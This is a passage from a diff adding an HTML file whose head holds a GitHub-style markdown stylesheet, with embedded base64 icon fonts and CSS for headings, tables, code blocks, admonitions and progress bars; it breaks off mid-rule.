@@ -1,0 +1,2195 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta charset="utf-8"><style>body {
+  width: 45em;
+  border: 1px solid #ddd;
+  outline: 1300px solid #fff;
+  margin: 16px auto;
+}
+
+body .markdown-body
+{
+  padding: 30px;
+}
+
+@font-face {
+  font-family: fontawesome-mini;
+  src: url(data:font/woff;charset=utf-8;base64,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) format('woff');
+}
+
+@font-face {
+  font-family: octicons-anchor;
+  src: url(data:font/woff;charset=utf-8;base64,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) format('woff');
+}
+
+.markdown-body {
+  font-family: sans-serif;
+  -ms-text-size-adjust: 100%;
+  -webkit-text-size-adjust: 100%;
+  color: #333333;
+  overflow: hidden;
+  font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif;
+  font-size: 16px;
+  line-height: 1.6;
+  word-wrap: break-word;
+}
+
+.markdown-body a {
+  background: transparent;
+}
+
+.markdown-body a:active,
+.markdown-body a:hover {
+  outline: 0;
+}
+
+.markdown-body b,
+.markdown-body strong {
+  font-weight: bold;
+}
+
+.markdown-body mark {
+  background: #ff0;
+  color: #000;
+  font-style: italic;
+  font-weight: bold;
+}
+
+.markdown-body sub,
+.markdown-body sup {
+  font-size: 75%;
+  line-height: 0;
+  position: relative;
+  vertical-align: baseline;
+}
+.markdown-body sup {
+  top: -0.5em;
+}
+.markdown-body sub {
+  bottom: -0.25em;
+}
+
+.markdown-body h1 {
+  font-size: 2em;
+  margin: 0.67em 0;
+}
+
+.markdown-body img {
+  border: 0;
+}
+
+.markdown-body hr {
+  -moz-box-sizing: content-box;
+  box-sizing: content-box;
+  height: 0;
+}
+
+.markdown-body pre {
+  overflow: auto;
+}
+
+.markdown-body code,
+.markdown-body kbd,
+.markdown-body pre,
+.markdown-body samp {
+  font-family: monospace, monospace;
+  font-size: 1em;
+}
+
+.markdown-body input {
+  color: inherit;
+  font: inherit;
+  margin: 0;
+}
+
+.markdown-body html input[disabled] {
+  cursor: default;
+}
+
+.markdown-body input {
+  line-height: normal;
+}
+
+.markdown-body input[type="checkbox"] {
+  box-sizing: border-box;
+  padding: 0;
+}
+
+.markdown-body table {
+  border-collapse: collapse;
+  border-spacing: 0;
+}
+
+.markdown-body td,
+.markdown-body th {
+  padding: 0;
+}
+
+.markdown-body .codehilitetable {
+  border: 0;
+  border-spacing: 0;
+}
+
+.markdown-body .codehilitetable tr {
+  border: 0;
+}
+
+.markdown-body .codehilitetable pre,
+.markdown-body .codehilitetable div.codehilite {
+  margin: 0;
+}
+
+.markdown-body .linenos,
+.markdown-body .code,
+.markdown-body .codehilitetable td {
+  border: 0;
+  padding: 0;
+}
+
+.markdown-body td:not(.linenos) .linenodiv {
+  padding: 0 !important;
+}
+
+.markdown-body .code {
+  width: 100%;
+}
+
+.markdown-body .linenos div pre,
+.markdown-body .linenodiv pre,
+.markdown-body .linenodiv {
+  border: 0;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-left-radius: 3px;
+  -webkit-border-bottom-left-radius: 3px;
+  -moz-border-radius-topleft: 3px;
+  -moz-border-radius-bottomleft: 3px;
+  border-top-left-radius: 3px;
+  border-bottom-left-radius: 3px;
+}
+
+.markdown-body .code div pre,
+.markdown-body .code div {
+  border: 0;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-right-radius: 3px;
+  -webkit-border-bottom-right-radius: 3px;
+  -moz-border-radius-topright: 3px;
+  -moz-border-radius-bottomright: 3px;
+  border-top-right-radius: 3px;
+  border-bottom-right-radius: 3px;
+}
+
+.markdown-body * {
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+}
+
+.markdown-body input {
+  font: 13px Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
+  line-height: 1.4;
+}
+
+.markdown-body a {
+  color: #4183c4;
+  text-decoration: none;
+}
+
+.markdown-body a:hover,
+.markdown-body a:focus,
+.markdown-body a:active {
+  text-decoration: underline;
+}
+
+.markdown-body hr {
+  height: 0;
+  margin: 15px 0;
+  overflow: hidden;
+  background: transparent;
+  border: 0;
+  border-bottom: 1px solid #ddd;
+}
+
+.markdown-body hr:before,
+.markdown-body hr:after {
+  display: table;
+  content: " ";
+}
+
+.markdown-body hr:after {
+  clear: both;
+}
+
+.markdown-body h1,
+.markdown-body h2,
+.markdown-body h3,
+.markdown-body h4,
+.markdown-body h5,
+.markdown-body h6 {
+  margin-top: 15px;
+  margin-bottom: 15px;
+  line-height: 1.1;
+}
+
+.markdown-body h1 {
+  font-size: 30px;
+}
+
+.markdown-body h2 {
+  font-size: 21px;
+}
+
+.markdown-body h3 {
+  font-size: 16px;
+}
+
+.markdown-body h4 {
+  font-size: 14px;
+}
+
+.markdown-body h5 {
+  font-size: 12px;
+}
+
+.markdown-body h6 {
+  font-size: 11px;
+}
+
+.markdown-body blockquote {
+  margin: 0;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+  padding: 0;
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body ol ol,
+.markdown-body ul ol {
+  list-style-type: lower-roman;
+}
+
+.markdown-body ul ul ol,
+.markdown-body ul ol ol,
+.markdown-body ol ul ol,
+.markdown-body ol ol ol {
+  list-style-type: lower-alpha;
+}
+
+.markdown-body dd {
+  margin-left: 0;
+}
+
+.markdown-body code,
+.markdown-body pre,
+.markdown-body samp {
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  font-size: 12px;
+}
+
+.markdown-body pre {
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body kbd {
+  background-color: #e7e7e7;
+  background-image: -moz-linear-gradient(#fefefe, #e7e7e7);
+  background-image: -webkit-linear-gradient(#fefefe, #e7e7e7);
+  background-image: linear-gradient(#fefefe, #e7e7e7);
+  background-repeat: repeat-x;
+  border-radius: 2px;
+  border: 1px solid #cfcfcf;
+  color: #000;
+  padding: 3px 5px;
+  line-height: 10px;
+  font: 11px Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  display: inline-block;
+}
+
+.markdown-body>*:first-child {
+  margin-top: 0 !important;
+}
+
+.markdown-body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+.markdown-body .headeranchor-link {
+  position: absolute;
+  top: 0;
+  bottom: 0;
+  left: 0;
+  display: block;
+  padding-right: 6px;
+  padding-left: 30px;
+  margin-left: -30px;
+}
+
+.markdown-body .headeranchor-link:focus {
+  outline: none;
+}
+
+.markdown-body h1,
+.markdown-body h2,
+.markdown-body h3,
+.markdown-body h4,
+.markdown-body h5,
+.markdown-body h6 {
+  position: relative;
+  margin-top: 1em;
+  margin-bottom: 16px;
+  font-weight: bold;
+  line-height: 1.4;
+}
+
+.markdown-body h1 .headeranchor,
+.markdown-body h2 .headeranchor,
+.markdown-body h3 .headeranchor,
+.markdown-body h4 .headeranchor,
+.markdown-body h5 .headeranchor,
+.markdown-body h6 .headeranchor {
+  display: none;
+  color: #000;
+  vertical-align: middle;
+}
+
+.markdown-body h1:hover .headeranchor-link,
+.markdown-body h2:hover .headeranchor-link,
+.markdown-body h3:hover .headeranchor-link,
+.markdown-body h4:hover .headeranchor-link,
+.markdown-body h5:hover .headeranchor-link,
+.markdown-body h6:hover .headeranchor-link {
+  height: 1em;
+  padding-left: 8px;
+  margin-left: -30px;
+  line-height: 1;
+  text-decoration: none;
+}
+
+.markdown-body h1:hover .headeranchor-link .headeranchor,
+.markdown-body h2:hover .headeranchor-link .headeranchor,
+.markdown-body h3:hover .headeranchor-link .headeranchor,
+.markdown-body h4:hover .headeranchor-link .headeranchor,
+.markdown-body h5:hover .headeranchor-link .headeranchor,
+.markdown-body h6:hover .headeranchor-link .headeranchor {
+  display: inline-block;
+}
+
+.markdown-body h1 {
+  padding-bottom: 0.3em;
+  font-size: 2.25em;
+  line-height: 1.2;
+  border-bottom: 1px solid #eee;
+}
+
+.markdown-body h2 {
+  padding-bottom: 0.3em;
+  font-size: 1.75em;
+  line-height: 1.225;
+  border-bottom: 1px solid #eee;
+}
+
+.markdown-body h3 {
+  font-size: 1.5em;
+  line-height: 1.43;
+}
+
+.markdown-body h4 {
+  font-size: 1.25em;
+}
+
+.markdown-body h5 {
+  font-size: 1em;
+}
+
+.markdown-body h6 {
+  font-size: 1em;
+  color: #777;
+}
+
+.markdown-body p,
+.markdown-body blockquote,
+.markdown-body ul,
+.markdown-body ol,
+.markdown-body dl,
+.markdown-body table,
+.markdown-body pre,
+.markdown-body .admonition {
+  margin-top: 0;
+  margin-bottom: 16px;
+}
+
+.markdown-body hr {
+  height: 4px;
+  padding: 0;
+  margin: 16px 0;
+  background-color: #e7e7e7;
+  border: 0 none;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+  padding-left: 2em;
+}
+
+.markdown-body ul ul,
+.markdown-body ul ol,
+.markdown-body ol ol,
+.markdown-body ol ul {
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body li>p {
+  margin-top: 16px;
+}
+
+.markdown-body dl {
+  padding: 0;
+}
+
+.markdown-body dl dt {
+  padding: 0;
+  margin-top: 16px;
+  font-size: 1em;
+  font-style: italic;
+  font-weight: bold;
+}
+
+.markdown-body dl dd {
+  padding: 0 16px;
+  margin-bottom: 16px;
+}
+
+.markdown-body blockquote {
+  padding: 0 15px;
+  color: #777;
+  border-left: 4px solid #ddd;
+}
+
+.markdown-body blockquote>:first-child {
+  margin-top: 0;
+}
+
+.markdown-body blockquote>:last-child {
+  margin-bottom: 0;
+}
+
+.markdown-body table {
+  display: block;
+  width: 100%;
+  overflow: auto;
+  word-break: normal;
+  word-break: keep-all;
+}
+
+.markdown-body table th {
+  font-weight: bold;
+}
+
+.markdown-body table th,
+.markdown-body table td {
+  padding: 6px 13px;
+  border: 1px solid #ddd;
+}
+
+.markdown-body table tr {
+  background-color: #fff;
+  border-top: 1px solid #ccc;
+}
+
+.markdown-body table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+.markdown-body img {
+  max-width: 100%;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+}
+
+.markdown-body code,
+.markdown-body samp {
+  padding: 0;
+  padding-top: 0.2em;
+  padding-bottom: 0.2em;
+  margin: 0;
+  font-size: 85%;
+  background-color: rgba(0,0,0,0.04);
+  border-radius: 3px;
+}
+
+.markdown-body code:before,
+.markdown-body code:after {
+  letter-spacing: -0.2em;
+  content: "\00a0";
+}
+
+.markdown-body pre>code {
+  padding: 0;
+  margin: 0;
+  font-size: 100%;
+  word-break: normal;
+  white-space: pre;
+  background: transparent;
+  border: 0;
+}
+
+.markdown-body .codehilite {
+  margin-bottom: 16px;
+}
+
+.markdown-body .codehilite pre,
+.markdown-body pre {
+  padding: 16px;
+  overflow: auto;
+  font-size: 85%;
+  line-height: 1.45;
+  background-color: #f7f7f7;
+  border-radius: 3px;
+}
+
+.markdown-body .codehilite pre {
+  margin-bottom: 0;
+  word-break: normal;
+}
+
+.markdown-body pre {
+  word-wrap: normal;
+}
+
+.markdown-body pre code {
+  display: inline;
+  max-width: initial;
+  padding: 0;
+  margin: 0;
+  overflow: initial;
+  line-height: inherit;
+  word-wrap: normal;
+  background-color: transparent;
+  border: 0;
+}
+
+.markdown-body pre code:before,
+.markdown-body pre code:after {
+  content: normal;
+}
+
+/* Admonition */
+.markdown-body .admonition {
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  position: relative;
+  border-radius: 3px;
+  border: 1px solid #e0e0e0;
+  border-left: 6px solid #333;
+  padding: 10px 10px 10px 30px;
+}
+
+.markdown-body .admonition table {
+  color: #333;
+}
+
+.markdown-body .admonition p {
+  padding: 0;
+}
+
+.markdown-body .admonition-title {
+  font-weight: bold;
+  margin: 0;
+}
+
+.markdown-body .admonition>.admonition-title {
+  color: #333;
+}
+
+.markdown-body .attention>.admonition-title {
+  color: #a6d796;
+}
+
+.markdown-body .caution>.admonition-title {
+  color: #d7a796;
+}
+
+.markdown-body .hint>.admonition-title {
+  color: #96c6d7;
+}
+
+.markdown-body .danger>.admonition-title {
+  color: #c25f77;
+}
+
+.markdown-body .question>.admonition-title {
+  color: #96a6d7;
+}
+
+.markdown-body .note>.admonition-title {
+  color: #d7c896;
+}
+
+.markdown-body .admonition:before,
+.markdown-body .attention:before,
+.markdown-body .caution:before,
+.markdown-body .hint:before,
+.markdown-body .danger:before,
+.markdown-body .question:before,
+.markdown-body .note:before {
+  font: normal normal 16px fontawesome-mini;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+  line-height: 1.5;
+  color: #333;
+  position: absolute;
+  left: 0;
+  top: 0;
+  padding-top: 10px;
+  padding-left: 10px;
+}
+
+.markdown-body .admonition:before {
+  content: "\f056\00a0";
+  color: 333;
+}
+
+.markdown-body .attention:before {
+  content: "\f058\00a0";
+  color: #a6d796;
+}
+
+.markdown-body .caution:before {
+  content: "\f06a\00a0";
+  color: #d7a796;
+}
+
+.markdown-body .hint:before {
+  content: "\f05a\00a0";
+  color: #96c6d7;
+}
+
+.markdown-body .danger:before {
+  content: "\f057\00a0";
+  color: #c25f77;
+}
+
+.markdown-body .question:before {
+  content: "\f059\00a0";
+  color: #96a6d7;
+}
+
+.markdown-body .note:before {
+  content: "\f040\00a0";
+  color: #d7c896;
+}
+
+.markdown-body .admonition::after {
+  content: normal;
+}
+
+.markdown-body .attention {
+  border-left: 6px solid #a6d796;
+}
+
+.markdown-body .caution {
+  border-left: 6px solid #d7a796;
+}
+
+.markdown-body .hint {
+  border-left: 6px solid #96c6d7;
+}
+
+.markdown-body .danger {
+  border-left: 6px solid #c25f77;
+}
+
+.markdown-body .question {
+  border-left: 6px solid #96a6d7;
+}
+
+.markdown-body .note {
+  border-left: 6px solid #d7c896;
+}
+
+.markdown-body .admonition>*:first-child {
+  margin-top: 0 !important;
+}
+
+.markdown-body .admonition>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* progress bar*/
+.markdown-body .progress {
+  display: block;
+  width: 300px;
+  margin: 10px 0;
+  height: 24px;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  background-color: #ededed;
+  position: relative;
+  box-shadow: inset -1px 1px 3px rgba(0, 0, 0, .1);
+}
+
+.markdown-body .progress-label {
+  position: absolute;
+  text-align: center;
+  font-weight: bold;
+  width: 100%; margin: 0;
+  line-height: 24px;
+  color: #333;
+  text-shadow: 1px 1px 0 #fefefe, -1px -1px 0 #fefefe, -1px 1px 0 #fefefe, 1px -1px 0 #fefefe, 0 1px 0 #fefefe, 0 -1px 0 #fefefe, 1px 0 0 #fefefe, -1px 0 0 #fefefe, 1px 1px 2px #000;
+  -webkit-font-smoothing: antialiased !important;
+  white-space: nowrap;
+  overflow: hidden;
+}
+
+.markdown-body .progress-bar {
+  height: 24px;
+  float: left;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  background-color: #96c6d7;
+  box-shadow: inset 0 1px 0 rgba(255, 255, 255, .5), inset 0 -1px 0 rgba(0, 0, 0, .1);
+  background-size: 30px 30px;
+  background-image: -webkit-linear-gradient(
+    135deg, rgba(255, 255, 255, .4) 27%,
+    transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%,
+    transparent 77%, transparent
+  );
+  background-image: -moz-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: -ms-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: -o-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+}
+
+.markdown-body .progress-100plus .progress-bar {
+  background-color: #a6d796;
+}
+
+.markdown-body .progress-80plus .progress-bar {
+  background-color: #c6d796;
+}
+
+.markdown-body .progress-60plus .progress-bar {
+  background-color: #d7c896;
+}
+
+.markdown-body .progress-40plus .progress-bar {
+  background-color: #d7a796;
+}
+
+.markdown-body .progress-20plus .progress-bar {
+  background-color: #d796a6;
+}
+
+.markdown-body .progress-0plus .progress-bar {
+  background-color: #c25f77;
+}
+
+.markdown-body .candystripe-animate .progress-bar{
+  -webkit-animation: animate-stripes 3s linear infinite;
+  -moz-animation: animate-stripes 3s linear infinite;
+  animation: animate-stripes 3s linear infinite;
+}
+
+@-webkit-keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+@-moz-keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+@keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+.markdown-body .gloss .progress-bar {
+  box-shadow:
